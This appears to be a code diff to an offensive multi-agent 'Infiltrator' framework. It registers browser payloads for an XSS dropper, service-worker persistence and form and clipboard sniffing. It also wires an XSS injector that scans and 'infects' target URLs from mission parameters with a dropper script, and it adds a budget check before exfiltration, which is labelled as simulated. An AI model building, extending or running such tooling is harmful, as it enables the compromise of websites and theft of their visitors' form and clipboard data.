@@ -212,11 +212,17 @@ class PayloadModule:
         self.sensor_packages = {}
         self.implant_registry = {}
         self.logic_injectors = {}
+        self.browser_payloads = {}
         
         self._initialize_payloads()
     
     def _initialize_payloads(self):
         """Initialize variant-specific payload collections"""
+        self.browser_payloads = {
+            'xss_browser_dropper': {'type': 'browser', 'impact': 'medium', 'persistence': True},
+            'sw_persistence': {'type': 'browser', 'impact': 'high', 'persistence': True},
+            'form_clipboard_sniffer': {'type': 'browser', 'impact': 'high', 'persistence': False}
+        }
         if self.variant == InfiltratorVariant.BLACK:
             # Passive sensors only for stealth
             self.sensor_packages = {
@@ -273,6 +279,12 @@ class PayloadModule:
             available_payloads.extend([
                 {'name': name, 'type': 'implant', 'config': config}
                 for name, config in self.implant_registry.items()
+            ])
+
+        if self.browser_payloads:
+            available_payloads.extend([
+                {'name': name, 'type': 'browser', 'config': config}
+                for name, config in self.browser_payloads.items()
             ])
         
         if not available_payloads:
@@ -1010,6 +1022,9 @@ class InfiltratorAgent(BaseAgent):
         self.targeting_logic = TargetingLogic()
         self.exfil_core = ExfilCore(str(self.agent_id))
         self.failsafe = FailSafe(str(self.agent_id))
+        self.exfiltrated_data_size = 0
+        self._exfil_queue = []
+        self._exfil_history = []
 
         # Economic integration: accountant engine
         self.accountant = None
@@ -1033,13 +1048,17 @@ class InfiltratorAgent(BaseAgent):
         self.nodes_infiltrated: set = set()
         self.threat_detections: list = []
 
-    def _deduct_exfiltration_cost(self, data_size_bytes: int):
-        """Deduct Root for exfiltration (5 Root per MB, round up)."""
+    def _deduct_exfiltration_cost(self, data_size_bytes: int) -> bool:
+        """Deduct Root for exfiltration (5 Root per MB, round up). Returns True if approved/affordable."""
         if self.accountant:
             from decimal import Decimal
             size_mb = max(1, int(data_size_bytes / 1_000_000))
             cost = Decimal('5') * Decimal(size_mb)
-            self.accountant.process_agent_spend(str(self.agent_id), cost, f"Exfiltration cost ({size_mb} MB)")
+            approved, reason = self.accountant.process_agent_spend(str(self.agent_id), cost, f"Exfiltration cost ({size_mb} MB)")
+            if not approved:
+                self.logger.warning(f"[💸] Infiltrator exfiltration blocked — insufficient ROOT: {reason}")
+                return False
+        return True
 
     def _reward_mission_complete(self):
         if self.accountant:
@@ -1149,6 +1168,29 @@ class InfiltratorAgent(BaseAgent):
                 self.logger.warning(f"[!] PrivescEngine integration error (non-fatal): {e}")
         
         # ========== END PRIVILEGE ESCALATION INTEGRATION ==========
+
+        # ========== BROWSER INFILTRATION INTEGRATION (Phase 6) ==========
+        if mission and (getattr(mission, 'name', '') in ("browser_infect", "xss_injection") or 
+                        "web_targets" in getattr(mission, 'parameters', {}) or 
+                        "target_urls" in getattr(mission, 'parameters', {})):
+            try:
+                self.logger.info("[🌐] Initiating browser payload delivery & XSS injection...")
+                from exploit.xss_injector import XSSInjector
+                
+                params = getattr(mission, 'parameters', {})
+                target_urls = params.get("target_urls") or params.get("web_targets") or []
+                payload_url = params.get("payload_url", "http://127.0.0.1:8000/dropper.js")
+                
+                injector = XSSInjector(payload_url=payload_url)
+                if target_urls:
+                    report = injector.scan_and_infect(target_urls)
+                    self.logger.info(f"[🌐] Browser infection report: {report['infected_count']}/{report['scanned_count']} targets infected")
+                    
+                    event = Event(event_type="browser_infection", payload=report, sender_id=str(self.agent_id))
+                    self._emit_event(event)
+            except Exception as e:
+                self.logger.warning(f"[!] Browser infiltration error (non-fatal): {e}")
+        # ========== END BROWSER INFILTRATION INTEGRATION ==========
 
     def _fingerprint(self) -> dict:
         """Comprehensive system fingerprinting with 47+ enumeration points."""
@@ -1652,13 +1694,17 @@ class InfiltratorAgent(BaseAgent):
                 payload: bytes = exfil_item['encrypted_payload']
                 endpoint: str = exfil_item.get('endpoint', random.choice(self.exfil_core.relay_endpoints) if self.exfil_core.relay_endpoints else "default_mock_endpoint")
 
+                # Economic gate check before exfiltrating
+                if not self._deduct_exfiltration_cost(record.data_size):
+                    self.logger.warning(f"[{self.agent_id}] Aborting exfil package {record.transmission_id}: insufficient ROOT budget")
+                    self.data_exfil_queue.task_done()
+                    continue
+
                 # Simulate successful exfiltration
                 self.exfiltrated_data_size += record.data_size
                 self.metrics['data_exfiltrated_total'] += record.data_size
                 self.exfiltration_log.append(record)
                 self.logger.info(f"[{self.agent_id}] Data package ID {record.transmission_id} successfully exfiltrated (simulated). Total mission exfil: {self.exfiltrated_data_size / 1024:.2f} KB")
-                # Deduct exfiltration cost (economic logic)
-                self._deduct_exfiltration_cost(record.data_size)
                 await asyncio.sleep(0.1)
             except Exception as e:
                 if isinstance(e, asyncio.TimeoutError):
